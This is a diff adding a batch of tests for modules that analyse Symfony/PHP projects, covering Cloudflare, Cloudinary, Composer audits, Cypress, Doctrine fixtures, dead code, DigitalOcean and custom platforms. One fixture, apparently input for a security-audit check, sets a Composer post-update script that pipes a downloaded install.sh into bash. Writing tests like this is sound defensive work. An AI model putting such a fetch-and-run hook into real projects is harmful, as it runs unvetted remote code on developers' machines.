@@ -57789,3 +57789,304 @@ encode
     expect(await runModule('cdn-config.js', plainHost)).toContain('static.example.com');
   });
 });
+
+describe('batch 219: workers, media, audits and fixtures', () => {
+  test('a Worker with no name and a recent compatibility date', async () => {
+    const app = appWith('cloudflare-recent-worker', {
+      'wrangler.json': JSON.stringify({
+        compatibility_date: '2026-01-15',
+        main: 'src/worker.js',
+      }, null, 2),
+    });
+
+    expect(await runModule('cloudflare-config.js', app)).toContain('compatibility_date');
+  });
+
+  test('a Cloudinary package named in prose, a secret from the environment and a signed upload preset', async () => {
+    const app = appWith('cloudinary-signed', {
+      'composer.json': JSON.stringify({
+        description: 'shop that uploads through cloudinary/cloudinary_php',
+        require: { 'symfony/framework-bundle': '^7.0' },
+      }, null, 2),
+      'src/Media/Uploader.php': `<?php
+
+namespace App\\Media;
+
+use Cloudinary\\Cloudinary;
+
+class Uploader
+{
+    public function configure(): void
+    {
+        Cloudinary::config(['api_secret' => getenv('CLOUDINARY_API_SECRET'), 'cloud_name' => 'shop']);
+    }
+
+    public function upload(string $file): array
+    {
+        return ['upload_preset' => 'shop_signed_preset'];
+    }
+}
+`,
+    });
+
+    expect(await runModule('cloudinary-integration.js', app)).toContain('Cloudinary');
+  });
+
+  test('an abandoned package listed only for development, and a post-update script that downloads', async () => {
+    const app = appWith('composer-audit-dev-abandoned', {
+      'composer.json': JSON.stringify({
+        require: { php: '>=8.2' },
+        'require-dev': { 'jms/serializer-bundle': '^5.0' },
+        scripts: { 'post-update-cmd': 'curl -s https://example.com/install.sh | bash' },
+      }, null, 2),
+    });
+
+    expect(await runModule('composer-security-audit.js', app)).toContain('abandoned');
+  });
+
+  test('a Cypress config that registers node events', async () => {
+    const app = appWith('cypress-with-tasks', {
+      'cypress.config.js': `module.exports = {
+  e2e: {
+    baseUrl: 'http://localhost:8000',
+    specPattern: 'cypress/e2e/**/*.cy.js',
+    setupNodeEvents(on, config) {
+      on('task', { seed: () => null });
+
+      return config;
+    },
+  },
+};
+`,
+    });
+
+    expect(await runModule('cypress-e2e-config.js', app)).toContain('specPattern');
+  });
+
+  test('a fixture interface with no class, a group of four fixtures and a dependency two of them share', async () => {
+    const fixture = (name: string, group: string, deps: string[]): string => `<?php
+
+namespace App\\DataFixtures;
+
+use Doctrine\\Bundle\\FixturesBundle\\Fixture;
+use Doctrine\\Common\\DataFixtures\\DependentFixtureInterface;
+
+class ${name} extends Fixture implements DependentFixtureInterface
+{
+    public function load($manager): void
+    {
+    }
+
+    public static function getGroups(): array
+    {
+        return ['${group}'];
+    }
+
+    public function getDependencies(): array
+    {
+        return [${deps.map((d) => `${d}::class`).join(', ')}];
+    }
+}
+`;
+
+    const app = appWith('fixture-groups-shared', {
+      'src/DataFixtures/BaseFixture.php': fixture('BaseFixture', 'base', []),
+      'src/DataFixtures/UserFixture.php': fixture('UserFixture', 'base', ['BaseFixture']),
+      'src/DataFixtures/OrderFixture.php': fixture('OrderFixture', 'base', ['BaseFixture']),
+      'src/DataFixtures/LineFixture.php': fixture('LineFixture', 'base', ['OrderFixture']),
+      'src/DataFixtures/FixtureContract.php': `<?php
+
+namespace App\\DataFixtures;
+
+use Doctrine\\Common\\DataFixtures\\FixtureInterface;
+
+interface FixtureContract extends FixtureInterface
+{
+}
+`,
+    });
+
+    expect(await runModule('database-fixture-groups.js', app)).toContain('fixtures');
+  });
+
+  test('an application whose controllers all have routes', async () => {
+    const app = appWith('dead-code-all-routed', {
+      'config/routes.yaml': `home:
+    path: /
+    controller: App\\Controller\\HomeController::index
+`,
+      'src/Controller/HomeController.php': `<?php
+
+namespace App\\Controller;
+
+class HomeController
+{
+    public function index(): array
+    {
+        return [];
+    }
+}
+`,
+      'templates/home.html.twig': `<h1>Shop</h1>
+`,
+      'templates/mail/welcome.html.twig': `<p>Welcome</p>
+`,
+      'src/Form/OrderType.php': `<?php
+
+namespace App\\Form;
+
+use Symfony\\Component\\Form\\AbstractType;
+
+class OrderType extends AbstractType
+{
+    public function buildForm($builder, array $options): void
+    {
+        $builder->add('reference');
+    }
+}
+`,
+    });
+
+    expect(await runModule('dead-code.js', app)).toContain('All controllers have at least one matching route');
+  });
+
+  test('a DigitalOcean app with a static site, a token of underscored capitals and a plain region', async () => {
+    const app = appWith('digitalocean-static-site', {
+      '.do/app.yaml': `name: shop
+region: fra
+jobs:
+  - name: migrate
+    kind: PRE_DEPLOY
+static_sites:
+  - name: front
+    source_dir: /public
+    envs:
+      - key: BUILD_TOKEN
+        value: AAAA_BBBB_CCCC_DDDD_EEEE
+      - key: NODE_ENV
+        value: prod
+`,
+    });
+
+    expect(await runModule('digitalocean-app-platform.js', app)).toContain('static');
+  });
+
+  test('two custom platforms, the second overriding more methods than the first', async () => {
+    const app = appWith('custom-platform-overrides', {
+      'src/Doctrine/SmallPlatform.php': `<?php
+
+namespace App\\Doctrine;
+
+use Doctrine\\DBAL\\Platforms\\AbstractMySQLPlatform;
+
+class SmallPlatform extends AbstractMySQLPlatform
+{
+    public function getName(): string
+    {
+        return 'small';
+    }
+}
+`,
+      'src/Doctrine/BigPlatform.php': `<?php
+
+namespace App\\Doctrine;
+
+use Doctrine\\DBAL\\Platforms\\AbstractMySQLPlatform;
+
+class BigPlatform extends AbstractMySQLPlatform
+{
+    public function getName(): string
+    {
+        return 'big';
+    }
+
+    public function getDateTimeFormatString(): string
+    {
+        return 'Y-m-d H:i:s';
+    }
+
+    public function getBooleanTypeDeclarationSQL(array $column): string
+    {
+        return 'TINYINT(1)';
+    }
+}
+`,
+      'src/Doctrine/ZHugePlatform.php': `<?php
+
+namespace App\\Doctrine;
+
+use Doctrine\\DBAL\\Platforms\\AbstractMySQLPlatform;
+
+class ZHugePlatform extends AbstractMySQLPlatform
+{
+    public function getName(): string
+    {
+        return 'huge';
+    }
+
+    public function getDateTimeFormatString(): string
+    {
+        return 'Y-m-d H:i:s';
+    }
+
+    public function getBooleanTypeDeclarationSQL(array $column): string
+    {
+        return 'TINYINT(1)';
+    }
+
+    public function getGuidTypeDeclarationSQL(array $column): string
+    {
+        return 'CHAR(36)';
+    }
+}
+`,
+      'src/Doctrine/BarePlatform.php': `<?php
+
+namespace App\\Doctrine;
+
+use Doctrine\\DBAL\\Platforms\\AbstractPlatform;
+use Doctrine\\DBAL\\Types\\Type;
+
+class BarePlatform extends AbstractPlatform
+{
+}
+
+Type::addType('bare', 'App\\\\Doctrine\\\\BareType');
+`,
+      'src/Doctrine/BareType.php': `<?php
+
+namespace App\\Doctrine;
+
+use Doctrine\\DBAL\\Types\\StringType;
+use Doctrine\\DBAL\\Types\\Type;
+
+class BareType extends StringType
+{
+}
+
+Type::addType('bare', 'App\\\\Doctrine\\\\BareType');
+`,
+      'src/Doctrine/PointType.php': `<?php
+
+namespace App\\Doctrine;
+
+use Doctrine\\DBAL\\Types\\StringType;
+
+class PointType extends StringType
+{
+    public function getName(): string
+    {
+        return 'point';
+    }
+
+    public function convertToPHPValue($value, $platform)
+    {
+        return $value;
+    }
+}
+`,
+    });
+
+    expect(await runModule('doctrine-custom-platform.js', app)).toContain('Overridden methods');
+  });
+});
